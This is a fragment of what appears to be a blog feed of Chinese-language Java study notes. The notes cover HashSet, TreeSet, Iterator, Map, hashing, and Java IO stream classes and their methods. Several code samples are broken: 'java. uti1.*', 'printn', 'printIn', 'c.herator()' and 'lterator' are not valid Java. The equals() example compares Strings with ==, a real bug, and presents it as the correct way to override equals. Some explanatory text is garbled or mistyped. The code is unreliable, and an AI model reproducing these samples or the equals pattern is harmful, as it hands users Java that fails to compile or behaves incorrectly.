id="HashSet类"><a href="#HashSet类" class="headerlink" title="HashSet类"></a>HashSet类</h2><ul><li><p>HashSet类实现了Set接口</p></li><li><p>HashSet容器中的元素是不能重复，无顺序的</p></li><li><p>存放入 HashSet 容器中的类必须要实现equals()和hahsCode方法</p></li><li><p><strong>如果要把一个对象放，set接口的实现类的对象里去，必须重构equals和hashcode方法</strong></p><p><strong>才能保证set容器中元素没有重复</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object ob)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Student st = (Student)ob;</span><br><span class="line"><span class="keyword">return</span> st.id == <span class="keyword">this</span>.id &amp;&amp; st.name == <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> id * <span class="keyword">this</span>.name.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="equals-和-hashCode-方法的使用"><a href="#equals-和-hashCode-方法的使用" class="headerlink" title="equals 和 hashCode 方法的使用"></a>equals 和 hashCode 方法的使用</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol><li><p>什么类要重写，equals 和 hashCode ，什么类不需要重写</p></li><li><p>为什么要重写</p></li><li><p>如何重写</p></li></ol><p>TreeSer 是否需要</p><p>答：什么类要充当容器时，添加到容器对象，必须要实现</p><p>容器是集合：一个可以用来存放其他类对象的类，这种类就叫集合或容器</p><h4 id="重写hashCode方法的必要"><a href="#重写hashCode方法的必要" class="headerlink" title="重写hashCode方法的必要"></a>重写hashCode方法的必要</h4><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/%E7%A4%BA%E4%BE%8B.png"></p><p><strong>如果是java定义的类有重写 hashCode()，如果是自己定义的类他没有重写hashCode()</strong></p><ul><li>String和 Integer这些Java自带的类都重写了hashCode方法，如果String和 Integer new出来的对象的内容是一样的，则这些对象的hashCode返回值也是一样的，尽管这些对象占用的是不同的内存</li><li>不过用户自定义类型则不同，如本程序的A类，即便是两个内容一模一样的A类对象，它们返回的hashCode值也是不一样的，但是两个内容一模一样的Integer类对象或者String类对象返回的hashCode值却是一样的，因为系统自带的String和Integer类都已经重写了Object的hashCode方法嘛</li><li>如果程序员希望自己定义的类对象，占用不同内存空间但内容却是一样的对象调用hashCode方法返回值是一样的，则程序员就必须自己重写hashCode方法，如本程序的B类</li></ul><h4 id="什么容器必须的重写equals方法和hashCode方法"><a href="#什么容器必须的重写equals方法和hashCode方法" class="headerlink" title="什么容器必须的重写equals方法和hashCode方法"></a>什么容器必须的重写equals方法和hashCode方法</h4><ul><li>添加到HashMap和Hashtable容器中的<strong>键</strong>必须的同时实现equals()方法和hashCode()方法，否则很可能导致容器中出现重复的映射，所谓重复映射是指同一个键值映射在容器中出现了多次</li><li>添加到HashSet容器中的<strong>对象</strong>也必须得同时实现equals()方法和hashCode()方法，否则很可能导致容器中出现重复的对象</li><li>更抽象的讲: <strong>Hashtable Ha shSet HashMap都必须的同时实现equals()方法和hashCode()方法, TreeSet和TreeMa p则不需要实现equals()方法和hashCode()方法</strong></li></ul><h4 id="HashCode存储"><a href="#HashCode存储" class="headerlink" title="HashCode存储"></a>HashCode存储</h4><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/%E5%AD%98%E5%82%A8%E5%9B%BE.png"></p><p>​    aa根据hashCode找到他存放的位置，然后通过equals方法判断后面是否有根aa对象相同的对象，有则不存放，没有则放，S容器自身不存放对象本身，存放的是地址，地址后面连接了很多元素，根据算法，不同的值不能找到相同的地址</p><p>​    不同的new has值是不同的，只要一重写就不是它的地址了，</p><p>为什么要重写equals方法</p><p>​    需要用eq判断两个对象是否相等，没有重写两个对象的equals是fas，以哈希表为内部存储方式的容器里面，才需要重写里面的hashCode 和 equals，HahSet也要重写，TreeSet不需要重写，因为内部算法不是hash表</p><h4 id="什么类必须得重写equals-和hashCode-方法"><a href="#什么类必须得重写equals-和hashCode-方法" class="headerlink" title="什么类必须得重写equals()和hashCode()方法"></a>什么类必须得重写equals()和hashCode()方法</h4><p>Hashtable HashSet HashMap都必须的同时实现equals()方法和hashCode()方法</p><p>TreeSet和TreeMap则不需要实现equals ()方法和hashCode()方法</p><h4 id="为什么要重写equals-和hashCode-方法"><a href="#为什么要重写equals-和hashCode-方法" class="headerlink" title="为什么要重写equals()和hashCode()方法"></a>为什么要重写equals()和hashCode()方法</h4><ul><li>预备知识：</li><li>散列码：<ul><li>Object中的hashCode方法会返回该对象的内存真实地址的整数化表示，这个形象的不是真正地址的整数值就是哈希码</li></ul></li><li><strong>向HashSet中添加对象时，HashSet先通过该对象的hashCode()计算出相应的桶,然后再根据equals()方法找到相应的对象。如果容器中己存在该对象则不再添加，如果不存在,则添加进去</strong></li></ul><p>（桶排序）</p><h4 id="怎样重写equals-和hashCode-方法"><a href="#怎样重写equals-和hashCode-方法" class="headerlink" title="怎样重写equals()和hashCode()方法"></a>怎样重写equals()和hashCode()方法</h4><h5 id="如何重写equals"><a href="#如何重写equals" class="headerlink" title="如何重写equals()"></a>如何重写equals()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    如果<span class="keyword">this</span>和Obj的内容是一摸一样的</span><br><span class="line">    返回<span class="keyword">true</span></span><br><span class="line">    否则</span><br><span class="line">    返回<span class="keyword">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="如何重写hashCode-方法"><a href="#如何重写hashCode-方法" class="headerlink" title="如何重写hashCode()方法"></a>如何重写hashCode()方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> 当前类中基本类型数据对象的hashCode()方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="例子没复制待完善"><a href="#例子没复制待完善" class="headerlink" title="例子没复制待完善"></a>例子没复制待完善</h1><h1 id="lterator接口（通过这个接口遍历数据）"><a href="#lterator接口（通过这个接口遍历数据）" class="headerlink" title="lterator接口（通过这个接口遍历数据）"></a>lterator接口（通过这个接口遍历数据）</h1><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/lterator%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><ul><li><p>boolean hasNext();</p><ul><li>是用来判断必前游标的后面还是否存在元素，如果存在返回真，否则返回假</li></ul></li><li><p>Object next();</p></li><li><p>先返回当前游标右边的元素，然后游标后移一个位置void remove()</p><ul><li>删除最近返回的元素,在调用remove之前，我们至少保证先调用一次next方法,而且调用next之后只能调用一次remove方法</li><li>remove()方法不推荐使用</li></ul></li><li><p>关键是<strong>游标初始位置是不是在第一个元素前面</strong>，remove之前必须调用next，一次next一次remove</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java. uti1.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestIterator_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//可以遍历所有Collection接口的实现类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showCollection</span><span class="params">(Collection c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    Iterator it = c.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext())</span><br><span class="line">        &#123;</span><br><span class="line">        System.out.printn(it.next());</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ArrayList al = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        al.add(<span class="string">&quot;one&quot;</span>);</span><br><span class="line">        al.add(<span class="number">22</span>);</span><br><span class="line">        al.add(<span class="keyword">new</span> Point (<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;al容器的内容是:&quot;</span>);</span><br><span class="line">        showCollection(al);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    实现了collection接口就可以遍历，It是游标， 想把容器中的所有元素都输出调用容器对象的iterator方法，方法已经实现好，返回的是一个班指针，写hasNext就知道下面有没有元素，如果有写next会返回元素。指针后移</p><h2 id="TreeSet类"><a href="#TreeSet类" class="headerlink" title="TreeSet类"></a>TreeSet类</h2><ul><li>TreeSet类实现了Set接口</li><li>TreeSet是一个有序集合，TreeSet中元素将按照升<strong>序排列</strong>，缺省是按照自然顺序进行排列，因此TreeSet中元素要实现Comparable接口</li><li>记住:所有可以进行排序的类都应该实现Comparable接口</li></ul><h5 id="TreeSet实例（以树为核心）"><a href="#TreeSet实例（以树为核心）" class="headerlink" title="TreeSet实例（以树为核心）"></a>TreeSet实例（以树为核心）</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Collection c = <span class="keyword">new</span> TreeSet();</span><br><span class="line">c.add(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">c.add(<span class="string">&quot;456&quot;</span>);</span><br><span class="line">c.add(<span class="string">&quot;234&quot;</span>);</span><br><span class="line">c.add(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">c.add(<span class="string">&quot;678&quot;</span>);</span><br><span class="line"></span><br><span class="line">lterator i = c.herator();</span><br><span class="line"><span class="keyword">while</span> (i.hasNext())</span><br><span class="line">&#123;</span><br><span class="line">System.out.printIn(i.next());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HashSet和TreeSet的比较"><a href="#HashSet和TreeSet的比较" class="headerlink" title="HashSet和TreeSet的比较"></a>HashSet和TreeSet的比较</h4><ul><li>HashSet是基于Hash算法实现的，其性能通常都优于</li><li>TreeSet。我们通常都应该使用HashSet，在我们需要排序的功能时，我们才使用TreeSet</li></ul><h1 id="Map接口"><a href="#Map接口" class="headerlink" title="Map接口"></a>Map接口</h1><p>java.util.Map接口描述了映射结构，Map结构允许以键集、值集合或键-值映射关系集的形式查看某个映射的内容。**(字典)**</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">put</span><span class="params">(Object key, Object value)</span></span></span><br><span class="line"><span class="function">Object <span class="title">get</span><span class="params">(Object key)</span></span></span><br><span class="line"><span class="function">注意Map接口中并没有 Object <span class="title">get</span><span class="params">(Object value)</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsValue</span><span class="params">(Object value)</span></span></span><br></pre></td></tr></table></figure><p>哈希冲突，越界【K5隐射到很远 不在容器，越界了】</p><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/%E5%93%88%E5%B8%8C%E5%86%B2%E7%AA%81%E8%B6%8A%E7%95%8C.png"></p><p>我们希望每个元素印射不一样，希望每个元素映射的地址连续</p><p>哈希因子</p><p>空间百分之75满了，会自动扩充，如果继续放会元素引起哈希冲突</p><p> 要求</p><ol><li><p>哈希因子不能过高</p></li><li><p>冲突如何解决，放在容器后</p></li></ol><h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><ul><li>哈希表的定义:<ul><li>哈希表不是只存储需要保存的数据，而是既保存数据，也保存该数据的主键，实际是:先保存主键，然后哈希表会根据某种算法自动计算出以当前主键为主键的数据的存储位置，然后再把该数据保存进去</li></ul></li><li>哈希表:<ul><li>假设待保存的数据是val, val的主键是key，则哈希表是先存储key，然后哈希表会自动根据key计算出val的存储位置，并最终把val存储进去</li></ul></li><li>哈希表注意事项：<ul><li> Hash即哈希表又称散列表-</li><li>Hash中不允许存在重复的键</li><li>哈希表主要是为了提高数据的存储速度和查找速度而设计的</li><li>哈希表是人类的一种追求，人很难设计出完美的哈希表</li><li>几乎所有的哈希表都会产生哈希冲突</li><li>Java中是利用桶来解决哈希冲突的</li></ul></li></ul><h2 id="Map接口-1"><a href="#Map接口-1" class="headerlink" title="Map接口"></a>Map接口</h2><ul><li>Map（映射）是一种把键对象和值对象进行映射的集合，它的每一个元素都包含一对键对象和值对象。</li><li>向Map集合中加入元素时，必须提供一对键对象和值对象，从Map集合中检索元素时，只要给出键对象，就会返回对应的值对象。</li><li>接口Map提供了根据关键字找对应的值的方法get(),定义如下:object get(Object key)</li></ul><h2 id="Map接口方法介绍"><a href="#Map接口方法介绍" class="headerlink" title="Map接口方法介绍"></a>Map接口方法介绍</h2><p>接口Map还提供了设置关键字和对应值的方法put()，定义如下;</p><ul><li></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">put</span><span class="params">(Object key,Object value)</span></span></span><br><span class="line"><span class="function">根据key计算出存储位置，然后把value存入此位置，如果该位置原来己有元素，则覆盖它该方法返回覆盖之前的元素对象的值，如果以前此位置为空，则返回<span class="keyword">null</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putAll</span><span class="params">(Map m)</span></span>;</span><br><span class="line">  把m容器中所有的元素存入当前容器</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsValue</span><span class="params">(Object value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Object <span class="title">remove</span><span class="params">(Object key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/map%E7%A4%BA%E4%BE%8B%E5%9B%BE1.png"></p><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/map%E7%A4%BA%E4%BE%8B%E5%9B%BE2.png"></p><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/map%E7%A4%BA%E6%84%8F%E5%9B%BE3.png"></p><ul><li><strong>在容器里所有东西都必须是对象</strong></li><li>指针所指的位置是元素前的位置</li><li>next()执行时是划过元素</li><li>it.next() 返回是是父类，需要转换</li><li>无论什么容器，内部的所有元素必须是对象，不能是基本类型数据</li><li>为什么可以放基本类型数据，因为进行了默认进行一个自动封装</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是容器&quot;&gt;&lt;a href=&quot;#什么是容器&quot; class=&quot;headerlink&quot; title=&quot;什么是容器&quot;&gt;&lt;/a&gt;什么是容器&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;有一种类专门用于存放其他类对象，这个类叫集合或者容器&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;为什</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 9流</title>
    <link href="http://example.com/2021/04/19/Java-9%E6%B5%81/"/>
    <id>http://example.com/2021/04/19/Java-9%E6%B5%81/</id>
    <published>2021-04-19T02:32:08.000Z</published>
    <updated>2021-04-21T11:26:44.527Z</updated>
    
    <content type="html"><![CDATA[<h1 id="流的定义"><a href="#流的定义" class="headerlink" title="流的定义"></a>流的定义</h1><ul><li><strong>流就是程序和设备之间嫁接起来的一根用于数据传输的管道</strong>，这个管道上有很多按钮,不同的按钮可以实现不同的功能</li><li>这根带按钮的用于数据传输的管道就是流</li><li><strong>流就是一根管道</strong></li><li>流是管道，<strong>程序和设备嫁接起来的用于数据传输的管道</strong></li><li>管道上有很多的按钮，不同按钮对应不同方法，调用不同方法就是按下不同按钮</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileReader fr = <span class="keyword">new</span> FileReader(<span class="string">&quot;D:\\shell.php&quot;</span>); <span class="comment">//流对象产生，一根管子（fr）从文件指向程序</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/19/Java-9%E6%B5%81/%E6%B5%81.png"></p><p><img src="/2021/04/19/Java-9%E6%B5%81/%E6%B5%81%E7%A4%BA%E6%84%8F%E5%9B%BE1.png"></p><p><img src="/2021/04/19/Java-9%E6%B5%81/%E6%B5%81%E7%A4%BA%E6%84%8F%E5%9B%BE2.png"></p><h1 id="流的分类标准"><a href="#流的分类标准" class="headerlink" title="流的分类标准"></a>流的分类标准</h1><p>java.io 包中定义了多个流类型(类或抽象类)来实现输入/输出功能；可以从不同的角度对其进行分类；</p><p>​    按数据流的方向不同可以分为输入流和输出流。</p><p>​    按处理数据单位不同可以分为字节流和字符流</p><p>​    按照功能不同可以分为节点流和处流。</p><p>J2SDK 所提供的所有流类型位于包 java.io 内都分别继承自以下四种抽象流类型。</p><table><thead><tr><th></th><th>字节流</th><th>字符流</th></tr></thead><tbody><tr><td>输入流</td><td>Inputstream</td><td>Reader</td></tr><tr><td>输出流</td><td>outputstream</td><td>Writer</td></tr></tbody></table><p>节点流可以是原始流</p><p>包裹流：对原始流的加工处理，外部提供一些功能更加强大、人性化的按钮</p><p>字节流：一个一个发送</p><p>字符流：两个一起发送</p><h1 id="节点流与处理流"><a href="#节点流与处理流" class="headerlink" title="节点流与处理流"></a>节点流与处理流</h1><p><img src="/2021/04/19/Java-9%E6%B5%81/%E8%8A%82%E7%82%B9%E6%B5%81%E4%B8%8E%E5%A4%84%E7%90%86%E6%B5%81.png"></p><h2 id="必须掌握的知识点"><a href="#必须掌握的知识点" class="headerlink" title="必须掌握的知识点"></a>必须掌握的知识点</h2><ul><li>什么叫流</li><li>流与类的关系<ul><li>如果一个类是用作设备和程序之间的数据传输，则这个类有一个新的名字叫流</li><li>流一定是类，但类不一定是流</li></ul></li><li>原始流与包裹流关系</li></ul><h1 id="四大基本抽象流"><a href="#四大基本抽象流" class="headerlink" title="四大基本抽象流"></a>四大基本抽象流</h1><ul><li><code>InputStream</code> <code>OutputStream</code> <code>Reader</code> <code>Writer</code> 这四个类都是抽象类</li><li>凡是以<strong>stream</strong>结尾的都是字节流</li></ul><h2 id="InputStream流中常用的方法"><a href="#InputStream流中常用的方法" class="headerlink" title="InputStream流中常用的方法"></a>InputStream流中常用的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">读取一个字节并以整数形式返回</span></span><br><span class="line"><span class="function">如果读取到输入流的末尾则返回-1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span>[] b)</span> <span class="keyword">throws</span> lOException</span></span><br><span class="line"><span class="function">从输入流中读取一定数量的字节，并将其存储在缓冲区数组b中。以整数形式返回实际读取的字节数</span></span><br><span class="line"><span class="function">如果b的长度为0，则不读取任何字节并返回0</span>;如果因为流位于文件末尾而没有可用的字节，则返回值-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">例子:</span><br><span class="line">FilelnputStream fis = <span class="keyword">new</span> FilelnputStream(<span class="string">&quot;d:\\share\\errorlog.txt&quot;</span>); </span><br><span class="line">len = fis.read(buf); <span class="comment">//从fis流所关联的d:\\share\\errorlog.txt文件中读取数据，并将读取出来的数据写入buf数组中，返回值是实际写入buf数组的字节个数,如果读取到文件的结尾，则返回-1</span></span><br><span class="line">[文件读完写入buf，Len记录着返回的字节个数]</span><br></pre></td></tr></table></figure><p><code>public int read(byte[] b, int off, int len) throws lOException</code></p><ul><li>从输入流中最多读取len个字节的数据并存入 byte数组中</li><li>b表示读取的数据要存入的数组的名字</li><li>off表示第一个读出的数据要存入的位置,是下标</li><li>len表示最多能读取的字节数</li><li>将从输入流所关联到的设备中读取的第一个字节存储在元素b[off]中，下一个字节存储在b[off+1]中，依次类推。读取的字节数最多等于len</li><li>尝试读取len个字节,但读取的字节也可能小于该值。以整数形式返回实际读取的字节数。</li><li>如果读到了文件的末尾,则返回-1</li></ul><p><code>void close() throws lOException</code></p><p>​    关闭此输入流并释放与该流关联的所有系统资源</p><p><code>long skip(long n) throws lOException</code>    </p><p>​    跳过和丢弃此输入流中数据的n个字节。(很少用)</p><h2 id="OutputStream流中常用的方法"><a href="#OutputStream流中常用的方法" class="headerlink" title="OutputStream流中常用的方法"></a>OutputStream流中常用的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向输出流中写入一个字节数据，该字节数据为参数b的低8位</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> b)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字节类型的数组中的数据写入输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span> <span class="params">(<span class="keyword">byte</span>[] b)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字节类型的数组中的从指定位置（off）开始的len个字节写入到输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span> <span class="params">(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//关闭流释放内存资源</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span><span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将输出流中缓冲的数据全部写出到目的地</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flush</span><span class="params">(<span class="keyword">throws</span> IOException</span></span></span><br></pre></td></tr></table></figure><p><strong>所有的输入流是没有flusch方法，输出流才有flush方法</strong></p><h2 id="Reader流的常用方法"><a href="#Reader流的常用方法" class="headerlink" title="Reader流的常用方法"></a>Reader流的常用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取一个字符并以整数的形式返回(0~255)，如果返回-1已到输入流的末尾。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//读取一系列字符并存储到一个数组buffer,返回实际读取的字符数，如果读取前已到输入流的末尾返回-1</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span> <span class="params">(<span class="keyword">char</span>[] cbuf)</span><span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//最多读取length个字符,并存储到一个数组buffer从length位置开始,返回实际读取的字符数，如果读取前以到输入流的末尾返回-1</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">char</span>[] cbuf, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//关闭流释放内存资源</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//跳过n个字符不读,返回实际跳过的字节数</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">skip</span><span class="params">(<span class="keyword">long</span> n)</span> <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure><h2 id="Writer流中常用方法"><a href="#Writer流中常用方法" class="headerlink" title="Writer流中常用方法"></a>Writer流中常用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向输出流中写入一个字符数据，该字节数据为参数b的低16位</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> c)</span><span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//将一个字符类型的数组中的数据写入输出流,</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">char</span>[]cbuf)</span> <span class="keyword">throws</span> IOException1</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字符类型的数组中的从指定位置(offset）开始的length个字符写入到输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">char</span>[]cbuf, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字符串中的字符写入到输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> 